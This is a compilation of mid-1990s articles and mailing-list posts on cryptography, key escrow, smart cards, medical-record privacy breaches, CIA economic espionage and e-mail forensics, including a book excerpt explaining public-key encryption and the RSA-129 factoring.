Myhrvold and Peter Rinearson, Viking, 1995.
[Paths to the Highway, pp. 106-111]
Governments have long understood the importance of
keeping information private, for both economic and
military reasons. The need to make personal, commercial,
military, or diplomatic messages secure (or to break into
them) has attracted powerful intellects through the
generations. It is very satisfying to break an encoded
message. Charles Babbage, who made dramatic advances in
"Deciphering is, in my opinion, one of the most
fascinating of arts, and I fear I have wasted upon it
more time than it deserves." I discovered its fascination
as a kid when, like kids everywhere, a bunch of us played
with simple ciphers. We would encode messages by
substituting one letter of the alphabet for another. If
a friend sent me a cipher that began "ULFW NZXX," it
would be fairly easy to guess that this represented "DEAR
BILL," and that U stood for D, and L for E, and so forth.
With those seven letters it wasn't hard to unravel the
rest of the cipher fairly quickly.
Past wars have been won or lost because the most powerful
governments on earth didn't have the cryptological power
any interested junior high school student with a personal
computer can harness today. Soon any child old enough to
use a computer will be able to transmit encoded messages
that no government on earth will find easy to decipher.
This is one of the profound implications of the spread of
fantastic computing power.
When you send a message across the information highway it
will be "signed" by your computer or other information
appliance with a digital signature that only you are
capable of applying, and it will be encrypted so that
only the intended recipient will be able to decipher it.
You'll send a message, which could be information of any
kind, including voice, video, or digital money. The
recipient will be able to be almost positive that the
message is really from you, that it was sent at exactly
the indicated time, that it has not been tampered with in
the slightest, and that others cannot decipher it.
The mechanism that will make this possible is based on
mathematical principles, including what are called
"one-way functions" and "public-key encryption." These
are quite advanced concepts, so I'm only going to touch
on them. Keep in mind that regardless of how complicated
the system is technically, it will be extremely easy for
you to use. You'll just tell your information appliance
what you want it to do and it will seem to happen
A one-way function is something that is much easier to do
than undo. Breaking a pane of glass is a one-way
function, but not one useful for encoding. The sort of
one-way function required for cryptography is one that is
easy to undo if you know an extra piece of information
and very diffficult to undo without that information.
There are a number of such one-way functions in
mathematics. One involves prime numbers. Kids learn about
prime numbers in school. A prime number cannot be divided
evenly by any number except 1 and itself. Among the first
dozen numbers, the primes are 2, 3, 5, 7, and 11. The
numbers 4, 6, 8, and 10 are not prime because 2 divides
into each of them evenly. The number 9 is not prime
because 3 divides into it evenly. There are an infinite
number of prime numbers, and there is no known pattern to
them except that they are prime. When you multiply two
prime numbers together, you get a number that can be
divided evenly only by those same two primes. For
example, only 5 and 7 can be divided evenly into 35.
Finding the primes is called "factoring" the number.
It is easy to multiply the prime numbers 11,927 and
20,903 and get the number 249,310,081, but it is much
harder to recover from the product, 249,310,081, the two
prime numbers that are its factors. This one-way
function, the difficulty of factoring numbers, underlies
an ingenious kind of cipher: the most sophisticated
encryption system in use today. It takes a long time for
even the largest computers to factor a really large
product back into its constituent primes. A coding system
based on factoring uses two different decoding keys, one
to encipher a message and a different but related one to
decipher. With only the enciphering key, it's easy to
encode a message, but deciphering it within any practical
period of time is nearly impossible. Deciphering requires
a separate key, available only to the intended recipient
of the message -- or, rather, to the recipient's
computer. The enciphering key is based on the product of
two huge prime numbers, whereas the deciphering key is
based on the primes themselves. A computer can generate
a new pair of unique keys in a flash, because it is easy
for a computer to generate two large prime numbers and
multiply them together. The enciphering key thus created
can be made public without appreciable risk, because of
the difficulty even another computer would have factoring
it to obtain the deciphering key.
The practical application of this encryption will be at
the center of the information highway's security system.
The world will become quite reliant on this network, so
it is important that security be handled competently. You
can think of the information highway as a postal network
where everyone has a mailbox that is impervious to
tampering and has an unbreakable lock. Each mailbox has
a slot that lets anyone slide information in, but only
the owner of a mailbox has the key to get information
out. (Some governments may insist that each mailbox have
a second door with a separate key that the government
keeps, but we'll ignore that political consideration for
now and concentrate on the security that software will
Each user's computer or other information appliance will
use prime numbers to generate an enciphering key, which
will be listed publicly, and a corresponding deciphering
key, which only the user will know. This is how it will
work in practice: I have information I want to send you.
My information appliance/computer system looks up your
public key and uses it to encrypt the information before
sending it. No one can read the message, even though your
key is public knowledge, because your public key does not
contain the information needed for decryption. You
receive the message and your computer decrypts it with a
private key that corresponds to your public key.
You want to answer. Your computer looks up my public key
and uses it to encrypt your reply. No one else can read
the message, even though it was encrypted with a key that
is totally public. Only I can read it because only I have
the private deciphering key. This is very practical,
because no one has to trade keys in advance.
How big do the prime numbers and their products have to
be to ensure an effective one-way function?
The concept of public-key encryption was invented by
Whitfield Diffie and Martin Hellman in 1977. Another set
of computer scientists, Ron Rivest, Adi Shamir, and
Leonard Adelman, soon came up with the notion of using
prime factorization as part of what is now known as the
RSA cryptosystem, after the initials of their last names.
They projected that it would take millions of years to
factor a 130-digit number that was the product of two
primes, regardless of how much computing power was
brought to bear. To prove the point, they challenged the
world to find the two factors in this 129-digit number,
known to people in the field as RSA 129:
   114,381,625,757,888,867,669,235,779,976,146,612,010,
   218,296,721,242,362,562,561,842,935,706,935,245,733,
   897,830,597,123,563,958,705,058,989,075,147,599,290,
   026,879,543,541
They were sure that a message they had encrypted using
the number as the public key would be totally secure
forever. But they hadn't anticipated either the full
effects of Moore's Law, as discussed in chapter 2, which
has made computers much more powerful, or the success of
the personal computer, which has dramatically increased
the number of computers and computer users in the world.
In 1993 a group of more than 600 academics and hobbyists
from around the world began an assault on the 129-digit
number, using the Internet to coordinate the work of
various computers. In less than a year they factored the
number into two primes, one 64 digits long and the other
65. The primes are as follows:
   3,490,529,510,847,650,949,147,849,619,903,898,133,
   417,764,638,493,387,843,990,820,577
   32,769,132,993,266,709,549,961,988,190,834,461,413,
   177,642,967,992,942,539,798,288,533
And the encoded message says: "The magic words are
squeamish and ossifrage."
One lesson that came out of this challenge is that a
129-digit public key is not long enough if the
information being encrypted is really important and
sensitive. Another is that no one should get too cocksure
about the security of encryption.
Increasing the key just a few digits makes it much more
difficult to crack. Mathematicians today believe that a
250-digit-long product of two primes would take millions
of years to factor with any foreseeable amount of future
computing power. But who really knows? This uncertainty

Wall Street Journal, Nov 23, 1995.
Money: Back to the Future?
By Walter Wriston (Former chairman of Citicorp)
Americans are about to begin using a new kind of money
that may have consequences for the Federal Reserve's
control of the money supply and almost certainly for the
velocity of money.
Over the years, people have used all kinds of things for
money, from the huge immovable stones in the front yards
of the residents of Yap Island to the more familiar
silver and gold. All these various mediums of exchange
will now be joined in our country by the "smart" card --
a piece of plastic embedded with a microchip.
Smart cards combine features of the following: automatic
teller machine cards that let you access your bank
account and draw cash; MasterCard or Visa cards that
permit you to buy now and pay later; and debit cards that
charge an account at the time of purchase. Not only can
smart cards do all of the above but they can also serve
as an "electronic purse" independent of your bank
account. These cards contain real money that can be spent
at stores and restaurants. In effect, the card is an
electronic traveler's check, but one that makes exact
change. In addition, the integrated circuit chip allows
a higher degree of security for the information stored
than do the current magnetic strip cards.
Smart cards are common in Europe and Asia, where some 400
million were shipped last year. The first large-scale use
of smart cards in this country will occur next year at
the Summer Olympics in Atlanta. Plans call for 300,000
rechargeable cards, and 700,000 disposable cards in
denominations of $25, $50 and $100. These cards would fit
nicely into the payment habits of Americans, since in the
U.S. it is estimated that 88% of transactions are done by
cash or check, and of these 83% are for less than $10. In
Atlanta, electronic "purse cards," which contain stored
value, could be spent at pay phones or vending machines.
When their stored value is exhausted, they are thrown
away. The smart cards, by contrast, can be taken back to
the issuer and recharged.
Their broad issuance and use could return America to
something very close to the free banking of the last
century, when every commercial bank issued dollar bills,
backed sometimes by the skill of the management,
sometimes by doubtful state bonds and sometimes by gold
or silver.
We have grown so accustomed to the familiar Federal
Reserve note that many forget that Americans had no
central bank for about 75 years -- from 1836, when
President Jackson vetoed the bill to renew the charter of
the Second Bank of the United States, to the start of
World War I, when the Federal Reserve Act was passed.
After the passage by New York state of the Free Banking
Act in 1838, the idea of state-chartered banks spread
across the country, and each commercial bank issued its
own dollar bills of various shapes and sizes.
This does not mean that the 19th century witnessed
complete currency chaos. In 1863, the National Bank Act
was passed to create a market in the government bonds
needed to finance the Civil War and to bring some order
to the private issuance of currency. The act required
that bank notes issued by commercial banks be uniform in
appearance and that they be backed by collateral
consisting of U.S. Treasury securities. As the old Civil
War bonds were paid off, the currency base of the country
declined some 60% from 1881 to 1890. This inflexible
system led to panics and instability.
To a certain extent, the Treasury Department during this
time assumed some of the functions of a central bank. All
during this period a debate raged, not about whether
America needed a central bank but about "free silver" and
the price at which the Treasury would buy gold and
silver. It was not until the eve of World War I that
passage of the Federal Reserve Act finally gave the U.S.
government a monopoly on the creation of money.
Now we may be going back to the future. The advent of
smart cards means that the Fed will lose its monopoly on
issuing currency, except that this time the new money
will be issued not only by banks but by all kinds of
companies, from convenience stores to telephone
companies. Nor is this the only trend threatening the
Fed's monopoly: Information technology is about to permit
the creation of both electronic token money and cash
money in cyberspace. Already we have Digi Cash in
Amsterdam reviving in modern guise something very close
to the old American free-banking system -- issuing
electronic money (backed by some depository bank holding
collateral in the form of Treasury securities) and
performing the clearing function.
None of this is necessarily a cause for panic. There is
very little, if any, evidence that government has managed
our currency values any better than the commercial banks
did in pre-Fed days. Indeed, the Nobel laureate economist
F.A. Hayek put it more strongly: "The history of
government management of money has, except for a few
short happy periods, been one of incessant fraud and
Still these new trends do present worries for central
bankers. If more and more firms issue cards for cash or
credit, what will be the effect on the velocity of money?
How will central banks form policies on the control of
the money supply if any company can issue electronic
purse cards on credit, with or without collateral? What
will happen if the issuer of the card goes broke?
As smart cards become more visible in America, regulators
and governments will begin to wonder about control of
money and credit. The Eulopean system of central banks
has produced an advisory report outlining a possible
regulatory response, and in this countly some Fed
officials are starting to wonder if their regulations
will be applicable. If one definition of money is an
object that has no use except to be given to someone else
in exchange for goods or services, smart cards are money

The Sunday Times, Top page one, 26 Nov 1995
For sale: your secret medical records for L150
by Lois Rogers and David Leppard
Confidential medical records of politicians, celebrities
and millions of other National Health Service patients
can be bought on the information black market for L150.
The contents of the files comprising patients' most
personal health details dating back 30 years, are being
sold to order by high-street detective agencies
advertising in the Yellow Pages.
The Sunday Times has discovered that GP practices across
Britain are failing to safeguard files which contain
sexual, mental and physical histories of patients. Files
on sale last week revealed how named patients had
vasectomy operations, or had a family history of
Alzheimer's disease and precancerous growths. They also
included the type and dose of medication prescribed,
visits to casualty units, and injuries suffered in road
The disclosures have prompted calls by opposition MPs and
doctors' leaders for urgent laws to protect the security
of the health records of Britain's 56.5m patients.
Alan Milburn, a Labour health spokesman, said he would be
asking Stephen Dorrell, the health secretary, to conduct
an urgent inquiry. "This is a violation of the special
relationship between doctors and their patients," said
Milburn. "I find it disturbing and deeply sinister.
Patients will be horrified to learn that their records
can be accessed by unknown organisations."
Alex Carlisle, the Liberal Democrat home affairs
spokesman and a lay member of the General Medical
Council, said: "It is ethically and morally outrageous
that organisations of any kind should obtain details like
that without consent. It is contrary to everything we are
told about the confidentiality of medical records. This
should be a crime punishable by imprisonment."
Milburn and Carlile were among more than a dozen people
who last week allowed The Sunday Times to expose the
security failures in the NHS records system by giving the
newspaper permission to access their confidential files
through commercial agencies.
The problem first came to light when one agency said it
was receiving more and more commissions from big
employers who wanted it to carry discreet checks on the
medical backgrounds of their employees. The agencies,
many of which advertise "private searches" in the Yellow
Pages, offer their services for fees ranging from L150 to
They offer to provide a written summary of anybody's
complete medical files within three hours. All they
require is the name, address and date of birth of the
patient they are investigating. They are thought to be
able to obtain the records by impersonating medical staff
and persuading them to disclose contents of the NHS files
over the telephone.
Last week a Sunday Times reporter posing as a prospective
client contacted 10 private detective agencies chosen at
random from the Yellow Pages. "Most of this stuff is on
manual records," said one employee of a London agency.
"It is pretty well protected. We're not officially
allowed [to do this] but it's perfectly possible." A
second private investigator said: "It's just a question
of knowing who and what to ask."
However, most declined to discuss the methods they used.
"What we are doing is illegal, and I'm not going into the
details over the telephone," said another agent in
Robertsbridge, East Sussex.
Dr Sandy Macara, chairman of the British Medical
Association council, which represents 105,000 doctors,
was among those who agreed to take part in the exercise.
Details of his medical and surgical history were provided
after a brief telephone call by a reporter to a private
agency. The information was faxed to the newspaper within
three hours, after a price of L150 was quoted. "This is
incredible. I cannot imagine how they have got this
information," Macara said.
The ease with which the health files could be obtained
posed a threat to the Electronic Patients' Records, a new
computer database which will soon contain the files of
all NHS patients in England and Wales, Macara said. "We
will have to ensure the new nationwide computer network
is as secure as humanly possible, and press for a
statutory right to confidentiality of patient
Elizabeth France, the data protection registrar, said the
Criminal Justice Act had recently tightened the law
regarding information obtained by deception. But the
penalties apply only to information held on computer,
rather than medical notes, which at present are held
mainly on hand-written files. "This is something we take
very seriously," France said. "We are actively pursuing
it. It doesn't mean the problems have been solved."
John Wadham, director of Liberty, the civil rights group,
called on the government to introduce a new criminal
offence of obtaining information by deception. "Such
information can obviously include material about sexually
transmitted diseases and material about an individual's
physical and mental health," he said. "There clearly
needs to be a right to privacy so the courts can act
against this."
Baroness Cumberlege, the junior health minister, said
confidentiality remained a cornerstone of the NHS. "We
are about to issue strengthened guidelines for security
of records within hospitals and new measures for
unauthorised access from external sources," she said. "We
are having discussions with the BMA and the Data
Protection Agency specifically about these issues."

WSJ, Nov 27, 1995
Cray Research to Unveil 2nd-Generation Parallel Processor
for Technical Market
By William M. Bulkley
Cray Research Inc., bidding to reassert its dominance of
high-end scientific supercomputing, is expected to unveil
tomorrow a new parallel-processing supercomputer with
unprecedented speed.
The Eagan, Minn., computer maker has been best-known for
its multimillion-dollar vector supercomputers that use
just a few very powerful processors. The new Cray T3E
will be its second-generation parallel processor. Unlike
its predecessor the T3D, it operates without being
connected to a traditional vector supercomputer.
People familiar with the machine say it will have a
theoretical top speed of more than one trillion
operations a second, or one teraflops, a measure of
supercomputer speed. Currently the only planned teraflops
machine is one that Intel Corp. is building for the
Energy Department's Sandia National Laboratories.
'Back in the Game'
"We look at this as evidence of Cray reasserting its
franchise in the technical computing market," said Debra
Goldfarb, who follows supercomputers for International
Data Corp., a market research firm in Framingham, Mass.
"Cray's back in the game."
The smallest models are likely to be priced at well under
$1 million. Buyers will be able to increase power by
adding just a few processors at a time in the future
making the systems "highly scalable" in industry
parlance. The T3E can be built with as few as 16
processors or as many as 2,048 processors.
"This reconfirms Cray's capabilities to build very
efficient high-performance computers," said Philip
Samper, chairman and chief executive officer, who was
hired last spring. Cray has said it will report a net
loss for the current year, reflecting restructuring
charges as Mr. Samper cuts costs, and sales are weak as
customers have been waiting for new generations of both
Cray's T90 vector supercomputers and the T3E. Mr. Samper
said that Cray will be profitable in the current fourth
quarter on an operating basis before an expected
restructuring charge, and "We expect to be profitable in
1996. That's very important for this company."
Mr. Samper, who declined to discuss details of the T3E,
said in an interview, "We have $100 million in orders
already in house. When customers get so excited they put
money on the line, that's the ultimate test." The T3E
won't be available for sale until the end of the first
quarter of 1996. Cray's total backlog was $355 million at
the end of the third quarter, including orders for the
Cray, the longtime leader in scientific supercomputing,
faced challenges from a host of smaller companies in the
late 1980s as well as three big Japanese computer makers.
But with the end of the Cold War, military need for
supercomputers diminished, Cray's sales plateaued and
several of the smaller companies went out of business.
Offsetting Some Declines
Analysts estimate the high-performance-computer market at
about $3 billion a year, with growth in commercial
markets for large databases and video-servers for
interactive-media, offsetting declines in government
business. International Business Machines Corp. and
Silicon Graphics Inc. have both grown rapidly by selling
parallel-processing systems in those markets.
Cray sells small commercial supercomputers and commercial
servers for computer networks of Sun Microsystems Inc.
workstations. However, analysts say it needs revenue from
the high-performance scientific market to rebound. Jay P.
Stevens, an analyst with Dean Witter, says sales in the
current year will fall 27% to $615 million from $921.6
million. Next year he forecasts a 20% rise to $808
million. Mr. Stevens predicts a net loss before charges
for 1995 of $73 million, or $1.25 a share, compared with
net income of $55.7 million, or $2.32 a share, in 1994.
Mr. Samper said that during the year, Cray has reduced
research-and-development spending by 16% and lowered
overheads. He said it plans to buy more parts from
outside suppliers, and is also controlling costs by
negotiating with government agencies to have them pick up
certain research and support costs.

A couple questions about Applied Cryptography (Second Edition)
1. What on earth is a Neural Net?
2. Consider the Chinese Lottery attack vs a processor bank.
   ADVANTAGES
     Distributed computing, no easy bombing target.
   DISADVANTAGES
     39% inefficient
     Need specialized hardware [for speed] or transmission of alogrithms
       for any specific alogrithm
     Not on all the time
     If value(crack) * cracks/chip > cost of chip, then why not have
       the gov buy the chips? Its probably cheaper that way.
3. How does one cryptoanalyize a Feistel Network? Is there a general
   method?
4. Does there exist an n such that a keyspace of 2^n is trivial to crack
   [ie a matter of miniutes] on a PC but is difficult to crack for a    big commercial company or even a major government? [this question
   relates to Merkle's puzzles, when a 40-bit key seems a bit weak.]
5. Is there an errata yet?

@_subject: Netscape gives in to key escrow 
Yes, bad. Yes, almost. Like a psychotic, Netscape has been teasing people with annoyingly buggy "betas," seeming to be well-intentioned, innocently clumsy, forgivable for its enthusiasm. Now the mask drops and we see the feral beast.
As usual, Tim states it concisely, even elegantly.
I can assure those who doubt this that Jim did not wake up one morning saying, "Gee, this security thing is just so-o-o-o big a nut to crack that we need to bump it upstairs to the Big Boys. Yeah! That's it! Uncle Sam will make the Internet safe for commerce! Boy, this is going to be a great day! Hey, Mom! Can I have a slice of your great apple pie for breakfast?  B-r-r-r!  It's brisk this morning! Mom, Where did you put my flag?"
With Netscape's sudden and surprising rise to prominence, its executives have no doubt been getting a crash course on what it's like to live in the world of people who take power and money VERY seriously. They've no doubt been disabused of childish notions and shown the glint of steely knives in the recesses of three-piece suits. No doubt more than one stomach plummeted to the sub-basement as they learned that Wonderland is populated by dark and deadly predators who don't just meekly make room for a new player.
Jim may not even be important enough to have been the one visited, but we can be sure someone was visited and explained some of the rules by which the full-contact professional game is played. What we are witnessing here is the loss of innocence, noticeable only because the time scale is so compressed by Netscape's explosive rise.
It's not even so much their caving that disgusts -- it's the hypocrisy. It's the lack of balls to say, "Guess what?  We got a most unusual visit by so-and-so who spoke unofficially for so-and-so, who wants us to know that we'll be toast if we push this issue of strong crypto."
It's as if someone you know suddenly takes up living with the creepy-crawlies in dark, damp places under rocks. One day you lift a rock and discover them there with some surprise, but instead of emerging or explaining, they say, "I like it here! This is the proper way to live!" and pull the rock back into place. It's not natural.
The Feds' approach to this kind of thing will be to make circumvention of escrow punishable by, say, a $10 million fine and 30 years in prison, with a teensy little provision that it doesn't matter how it comes to their attention.  That way, you not only run the risk that they find out by virtue of you having become a target of authorized eavesdropping, you run the risk that a, um, mistaken or, er, collateral eavesdrop reveals that your communications are circumventing escrow.
People in Montana and Nevada probably once thought the highway speed genie was out of the bottle, but all it took was fuel-shortage hype to enact a law effectively instituting a "national" speed limit, even though federal control of travel on roads outside federal reservations is wholly without constitutional authority.  Most people have some contact with issues of cars, gasoline, speed, and fuel economy, yet there was barely a whimper. How likely is it that more than a few percent of the population will even grasp what is being done to them with key escrow and the PR flim-flam that will be used to spackle over the real issues?
I have.  I'll reconsider when Jim reveals who inoculated him with GAK juice and when Netscape own up to how they caved and publicly disavow the position he advanced.
Not to be overly dramatic, but this sounds like a non-policy German expatriate might have sounded in the late 1930's, trying to quell alarm over reports of atrocities filtering out of the Reich. It may be well-intentioned, but it's out of the loop.
This is the "turd in the punchbowl" principle, Jeff. Suppose your Presidential candidate sounded fine in 95% of his coverage, and only in 5% is he reported to advocate raising human children on farms for organ harvest? How big a turd does there have to be in the punchbowl before you will consider the punch unfit to drink? "Well, hell! There's only the ONE, and it's not even as big as the ice cubes!"  Right.
So we're supposed to operate on the same blind faith you display. Right.
Jeff, what you're revealing is a bit of confusion with respect to who runs the company. With all due respect, and taking your statements at face value without reading subterfuge into them, I believe you're in the dark, and positioned to get a hard lesson in real world corporate politics. Do you like your job? Do you have a mortgage? If this doesn't go down the way you think it's going, will YOU tell all?
Dark periods of history are full of well-intentioned people who, in the crunch, opted to save their own skins and facilitated whatever they were told to facilitate.
You can be sure of that. Meanwhile, if you really have principles, start taking names. Names, dates, places, things. If you're right, you can throw it all away later. If we're right, you'll have an opportunity to shed light on the process sometime down the road.

NetManage & Cylink In Internet Encryption Deal
Guildford, Surrey, England, Oct 5 -- NetManage, a TCP/IP
specialist company, has signed a licensing deal with
Cylink Corporation. NetManage says the Cylink public key
cryptography technology will be incorporated in future
editions of NetManage's Internet applications software.
The move is significant since it marks the beginnings of
a competitor to the Netscape "secure" Web browsing
software, which has had two security flaws identified in
recent weeks.
Initially, NetManage's Chameleon Enterprise TCP/IP
applications suite will incorporate the Cylink public key
encryption technology, and later will include encryption
facilities in Internet Chameleon, a UKP139 PC-Windows
access suite designed for dial-up access to the Internet.
Both NetManage and Cylink plan to support an open
interface for Internet security which addresses the flaws
found in Netscape. The idea is to establish an open set
of standards to which Internet access packages of all
types will adhere to, and so ensure that companies
developing Internet software do not "re-invent the wheel"
when writing their software, and possibly open their
applications up to flaws.
According to NetManage, establishing a secure Internet
connection requires an Internet application to perform
two functions: authenticating the user, and encrypting
the data flow.
The link with Cylink will allow NetManage to license and
include the Cylink public key encryption technology in
its applications with a variety of ciphering systems to
be used in the NetManage suite, including: DES, Triple
DES, Safer, IDEA, Skipjack, RC-2, and RC-4.
NetManage claims the current implementations of security
proposed as standards by Netscape and RSA Data Security
are flawed, and fail to fully accommodate "open and
interoperable secure communications" between computers
which use different bulk encryption ciphers.
These problems, the company claims, have limited the
adoption of Internet security as a widespread
interoperable feature of all Internet software and
hardware products, including end-user applications,
servers, firewalls, and secure routers.
Later this month, NetManage and Cylink plan to announce
a next-generation "plug and play" Internet encryption
system. The implementation will be open and will not lock
software or hardware developers into the use of
encryption technology from any one vendor, as is the case
with Netscape, say the companies.
The related APIs, key exchange technology, and
encryption, will be made publicly available to other
software and hardware vendors. Licensing will include
source code and no per-copy royalty fees.

PCMCIA Establishes Security Card Working Group
The dream of a standardized encryption interface may soon
be realized!
San Jose, Calif., Oct. 5 /PRNewswire/ -- PCMCIA has
formed a new Working Group dedicated to standardizing and
promoting the PC Card as an interface for data encryption
and digital signature applications.
The Working Group was formed to work within the PCMCIA
Technical Committee to help the Association define and
standardize the capabilities and requirements for PC Card
Security Card devices.  The Group's immediate goals are
to define the necessary extensions to the PC Card
Standard that will allow easy identification of Security
Card devices, and to proactively identify other vendors
in the market and solicit their support for standardizing
PC Cards as a security device.
The formation of this Group represents the formalization
of an industry trend.  A standardized form factor and
interface for security devices is finally an attainable
goal thanks to the widespread acceptance of PC Card
technology," said Gary Visser, a senior software engineer
with Spyrus Communications and Co-Chairperson of the
Working Group.  "It is this high level of host support
that will promote PC Cards as a solution for electronic
banking and commerce."
PC Cards are seen by many experts as an ideal solution
for digital signature and data encryption applications
due to the established base of PC Card slots, and because
most security applications are math intensive and require
the processing power and storage of computers.
The proposal to form the Group was presented to PCMCIA by
Spyrus, Inc. of San Jose, California.  The group will be
co-chaired by Edward Tuggle of IBM Corporation and Visser
of Spyrus, Inc.

This excerpt is from the summary of a long policy
statement on the National Security Science and Technology
Strategy published by the White House on September 19.
The full report is well worth reading -- it addresses
military, economic, intelligence, scientific and
technological issues and lays out projected initiatives.
Has anyone seen news reports on this?                    Executive Summary
In March 1995, President Clinton ordered a sweeping
reexamination of the United States Government's approach
to putting science and technology to the service of
national security and global stability in light of the
changed security environment, increasing global economic
competition, and growing budgetary pressures.
This National Security Science and Technology Strategy,
the product of that reexamination, is the country's first
comprehensive Presidential statement of national security
science and technology priorities.
It augments the President's National Security Strategy of
Engagement and Enlargement by articulating science and
technology policies and initiatives that support the
President's three primary national security objectives:
enhancing our military readiness and capabilities,
preventing conflict from occurring through engagement
with other nations, and promoting prosperity at home. It
advances that document's central approach of preventing
conflict and maintaining the capability to respond should
conflict occur.
It is built on the recognition that our security depends
on economic strength as well as military power. And it is
grounded in the conviction that investment in science and
technology is central to our ability to meet the
challenges ahead.
This National Security Science and Technology Strategy
defines our new approaches to applying science and
technology to the challenges that most directly affect
our nation's security.

The anonymous post of the White House's National Security
Science and Technology Strategy recalls debate on this policy
underlying reports on CIA economic espionage:
Clinton instructs CIA to focus on trade espionage - report
Los Angeles, Jul 23 (Reuter) - President Clinton has ordered
the Central Intelligence Agency to make economic espionage a
top priority, according to a report in the Los Angeles Times
on Sunday.
The report quotes American intelligence sources who say the
CIA was instrumental in providing U.S. trade negotiators
information during heated auto trade talks with Japan this
spring, and has helped uncover bribes by rival nations
competing with U.S. firms for government contracts.
The sources say Clinton has issued a classified set of
intelligence priorities for the post Cold-War era, and that
the CIA is providing case officers with new training on
economic matters to meet the new challenge.
The recent trade talks with Japan were viewed as a success of
the new policy, according to the Times report. It said U.S.
Trade Representative Mickey Kantor was pleased with the CIA's
ability to report on the bargaining positions of American
But the agency has reportedly been less willing to spy on
individual companies. In one recent success in that area the
CIA discovered that the French were offering bribes to
Brazilian officials to help telecommunications giant Thompson
win a government contract. The report says intelligence
information helped U.S.-based Raytheon Co. elbow out Thompson
of France to win the work.
But the problem in such work, say intelligence sources, is
determining which multinational corporations based in the
United States should be considered "American" firms deserving
assistance. Because of this confusion, CIA officials argue
they should be kept out of spy work targeting individual
foreign business at the behest of U.S. corporations.
Even so, the Times report says the intelligence community has
told Congress it can claim credit for uncovering bribes
affecting $30 billion in foregin contracts over the past few

E-Mail That Comes Back And Bites. Even Deleted Messages
Can Be Recovered for Court [excerpts]
Computer sleuth John Jessen dredges computer files for
electronic embarrassments that their authors thought were
long gone. "Deleted" e-mail messages can pile up like
little time bombs until someone such as Jessen arrives,
carrying a court order and a stack of blank memory
"Can you really delete e-mail?  Sure," Jessen said. "Does
it happen as a common practice? No."
Jessen is the founder of Electronic Evidence Discovery
Inc., a Seattle company that since 1987 has been going
after computer evidence in civil lawsuits. The nation's
25 million to 40 million users of e-mail are growing more
comfortable with the medium. And more attorneys are
recognizing e-mail's potential as a source of unguarded
information about the companies they're suing.
"People are very candid talking around the coffee
machine." attorney Michael Patrick of Palo Alto, Calif.,
said. "They seem to behave the same way on the computer
"They think they're speaking confidentially, so they're
off the cuff," he said. "They're very often insulting.

Many workers think their e-mail is private. It's not.
Federal law allows employers to monitor employees'
e-mail, and even if they don't, e-mail is fair game in
lawsuits. When someone sues a company, the rules of
discovery demand that the company produce all relevant
business records.
"The fact that they live in a computer rather than a file
cabinet doesn't make any difference to the court," said
Joan Feldman at Computer Forensics, another Seattle firm
that specializes in this work.
Often files retrieved include e-mail thought to have been
erased long ago. It survives because the diligent
computer system manager makes backup tapes of everything
on the system every night, then stores those tapes for
And so the files persist and multiply, aided by
technological advances that continually add more storage
capacity, more automatic backups and more redundancies to
safeguard data from accidental erasure.
"The computer is like a file cabinet tbat can open its
own drawer, put a file on the copy machine and then slip
the copy into another cabinet," Jessen said. "Sometimes
I think it's alive."
Jessen and Feldman augment their high-tech detective work
by advising companies how to become less vulnerable to
computer snoops like themselves: They recommend regular
purges of old data, and they offer tips for avoiding
e-mail blunders in the first place. Rule No. 1: Don't put
anything on e-mail that you wouldn't want a jury to see.

Underscores Company's Commitment to US Government Market
Mountain View, Calif., Oct. 10 -- Netscape Communications
Corporation announced today its intent to support the
Fortezza security card, a security technology based on US
government standard cryptography, as a low-cost upgrade
capability for its Netscape Navigator(TM) client software
and other Netscape products. The new capability will

Developed by the National Security Agency, Fortezza PC
card technology provides strong authentication and
encryption services using US government standard
cryptography, implemented in an industry-standard PCMCIA
security token.  Fortezza PC cards are being used in the
Defense Message System (DMS), a new Department of Defense
electronic messaging system; Intelink, the new US
Government Intelligence Community search system based on
Web technology, and in a number of other government
"Fortezza is an important technology for major internal
US government networks and for organizations needing
Web-based technology with strong security," said Marc
Andreessen, vice president of technology at Netscape. "Support of Fortezza technology will strengthen our
position as a leading supplier of Web-based software
products to the federal government.  We can use the
experience gained with Fortezza and the Secure Sockets
Layer open protocol to implement support for additional
cryptographic devices important to both the federal
government and commercial markets."
Netscape expects to work with information security
specialist Litronic Industries and others regarding the
development, integration and support of the Fortezza
cryptographic interface.  Litronic provides technical
expertise for the implementation of Fortezza libraries
and drivers on a wide variety of platforms. California-based Litronic Industries designs,
manufactures and markets information security products
used to secure applications and data transmissions
through the use of encryption technology.
Support for Fortezza has been added to Netscape's Secure
Sockets Layer (SSL) open protocol.  SSL provides a
straightforward method for adding strong security to
existing applications and network infrastructures.  SSL
is application protocol independent and provides
encryption, which creates a secured channel to prevent
others from tapping into the network; authentication,
which uses certificates and digital signatures to verify
the identity of parties in information exchanges and
transactions; and message integrity, which ensures that
messages cannot be altered en route.  Netscape will
upgrade Netscape Navigator and other Netscape products to
support the use of Fortezza with SSL as an enhanced
alternative to software-based cryptographic mechanisms.
"The US government is rapidly moving to World Wide Web
and related open systems technology as an alternative to
proprietary networks and applications," said Paul A.
Strassmann, former director of defense information and
principal deputy assistant secretary of defense, and
currently distinguished visiting professor of information
warfare at the National Defense University.  "Many
federal agencies are adopting Fortezza technology as a
means to secure network transactions over unclassified
and classified networks.  We are pleased to see Netscape
provide support for Fortezza cryptographic cards in a
commercial product based on open systems standards."

Partnership Targets Billion Dollar Smart Card Market Denver, October 11 -- Racom Systems Inc. has entered into
a multi-million dollar partnership with Rohm Co. Ltd, a
Japanese company, to manufacture the ferroelectric chips
used in contactless, battery-free smart cards. The deal
also calls for Rohm to manufacture a new generation of
advanced microprocessor-based chips currently under
development for use in high-security financial
Rohm is currently starting up a new 0.6 micron wafer
fabrication operation in Kyoto, Japan, dedicated to the
high-volume manufacture or ferroelectric chips, and has
licensed Racom's contactless, battery-free technology
specifically for the Japanese market. Racom said the
cards are already in use in over 100 installations
Racom spokesperson Laura Keane said the
ferroelectric-based smart cards, which exchange
information with readers via radio waves instead of being
passed through a reader like a credit card, are used for
electronic ticketing: automatic fare collection on
buses, subways and trains, electronic point-of-sale, and
electronic benefits transfer.
Racom said the new cards are superior to the earlier
smart cards that use conventional semiconductor
technologies because of their unique combination of
high-speed, low-power, non-volatile operation, and high
The new smart cards have the ability to store as many as
16 different accounts, said Keane. It could hold your
checking account, credit card account, let you pay for a
bus or train ticket, and allow you access to controlled
areas within your workplace.
Keane spoke about some of the card's advantages. In
automatic fare collection, users no longer have to carry
the correct change or tokens, waiting times to board are
reduced, and the risk of robbery of bus, subway and train
operators is reduced since they have less cash on board.
"It's a stored value card," said Keane. "You put money on
